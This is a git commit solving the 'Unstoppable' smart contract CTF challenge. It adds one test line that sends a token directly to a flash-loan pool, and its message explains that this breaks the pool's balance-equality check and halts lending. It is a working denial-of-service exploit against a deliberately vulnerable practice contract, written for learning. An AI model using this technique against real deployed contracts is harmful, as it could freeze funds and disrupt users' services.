c23484df2a1f3d558b7456cac2c42966725e0545
Gabriel Horacio Cutrini <gabriel.cutrini@gmail.com>
2021-02-12 23:31:25 -0300

    Solves challenge 1º Attacker transfers tokens to pool causing pool's tracking of pool balance to be out of sync with actual pool balance. Pool's ability to execute flash loans is halted because an equality assertion is made between queried value of pool balance before loan and tracked valued of pool balance within contract.

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,6 +40,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await this.token.transfer(this.pool.address, ether('0.000000000000000001'), { from: attacker });
     });
 
     after(async function () {
